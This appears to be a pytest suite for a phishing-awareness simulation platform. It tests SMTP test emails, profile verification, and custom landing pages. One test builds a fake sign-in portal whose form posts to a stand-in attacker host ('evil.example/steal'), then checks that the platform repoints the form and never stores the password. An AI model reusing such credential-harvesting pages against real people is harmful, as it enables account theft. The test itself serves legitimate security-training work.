"""Phase 3: custom landing pages + send-test-email."""
from __future__ import annotations

from fastapi.testclient import TestClient


def _make_prereqs(c: TestClient, tag: str) -> dict:
    tpl = c.post(
        "/api/v1/templates",
        json={"name": f"{tag} tpl", "subject": "Hi {{.FirstName}}", "html": "<a href='{{.URL}}'>go</a>", "text": "go {{.URL}}"},
    ).json()
    prof = c.post(
        "/api/v1/profiles",
        json={"name": f"{tag} prof", "from_address": "it@example.com", "host": "localhost", "port": 1025},
    ).json()
    grp = c.post(
        "/api/v1/groups",
        json={"name": f"{tag} grp", "targets": [{"email": "carol@example.com", "first_name": "Carol"}]},
    ).json()
    return {"tpl": tpl["id"], "prof": prof["id"], "grp": grp["id"]}


def test_send_test_email_uses_real_smtp_and_reports_failure(auth_client: TestClient) -> None:
    # A test email must exercise real SMTP (not the console/dev backend). With no
    # SMTP server listening on localhost:1025, it should fail with a clear reason
    # — proving it actually tried to connect instead of faking success.
    ids = _make_prereqs(auth_client, "testmail")
    resp = auth_client.post(
        "/api/v1/test/email",
        json={"profile_id": ids["prof"], "template_id": ids["tpl"], "to_email": "qa@example.com"},
    )
    assert resp.status_code == 502
    assert "Send failed" in resp.json()["detail"]


def test_verify_profile_reports_connection_failure(auth_client: TestClient) -> None:
    ids = _make_prereqs(auth_client, "verify")
    resp = auth_client.post(f"/api/v1/profiles/{ids['prof']}/verify")
    # No SMTP server -> a clear "SMTP check failed" rather than a false positive.
    assert resp.status_code == 400
    assert "SMTP check failed" in resp.json()["detail"]


def test_runtime_settings_exposed(auth_client: TestClient) -> None:
    s = auth_client.get("/api/v1/settings").json()
    assert s["mail_backend"] == "console"  # test config
    assert "capture_passwords" in s


def test_custom_landing_page_capture(auth_client: TestClient) -> None:
    ids = _make_prereqs(auth_client, "landing")

    # A landing page with a login form whose action points somewhere else —
    # the renderer must repoint it at our tracking endpoint.
    page = auth_client.post(
        "/api/v1/pages",
        json={
            "name": "fake portal",
            "html": (
                "<h1>Hello {{.FirstName}}</h1>"
                "<form action='https://evil.example/steal' method='post'>"
                "<input name='username'><input name='password' type='password'>"
                "<button>Sign in</button></form>"
            ),
            "redirect_url": "http://testserver/learn",
        },
    ).json()

    camp = auth_client.post(
        "/api/v1/campaigns",
        json={
            "name": "p3 camp",
            "template_id": ids["tpl"],
            "profile_id": ids["prof"],
            "group_id": ids["grp"],
            "page_id": page["id"],
            "phish_url": "http://testserver",
        },
    ).json()
    cid = camp["id"]
    assert camp["page_id"] == page["id"]

    auth_client.post(f"/api/v1/campaigns/{cid}/launch")
    detail = _wait_sent(auth_client, cid)
    rid = detail["results"][0]["rid"]

    # GET the landing page: personalized + form repointed at /p/{rid}.
    page_html = auth_client.get(f"/p/{rid}").text
    assert "Hello Carol" in page_html
    assert "evil.example" not in page_html
    assert f"/p/{rid}" in page_html

    # POST the form with a password: recorded as submitted, redirected to learn,
    # and the password value stored nowhere.
    sub = auth_client.post(
        f"/p/{rid}", data={"username": "carol@example.com", "password": "s3cret!"}, follow_redirects=False
    )
    assert sub.status_code == 303
    assert sub.headers["location"] == "http://testserver/learn"

    events = auth_client.get(f"/api/v1/campaigns/{cid}/events").json()
    assert any(e["type"] == "submitted_data" for e in events)
    assert "s3cret" not in str(events)

    stats = auth_client.get(f"/api/v1/campaigns/{cid}").json()["stats"]
    assert stats["submitted"] == 1


def _wait_sent(c: TestClient, cid: int, tries: int = 50):
    import time

    for _ in range(tries):
        d = c.get(f"/api/v1/campaigns/{cid}").json()
        if d["stats"]["sent"] >= 1:
            return d
        time.sleep(0.1)
    return c.get(f"/api/v1/campaigns/{cid}").json()
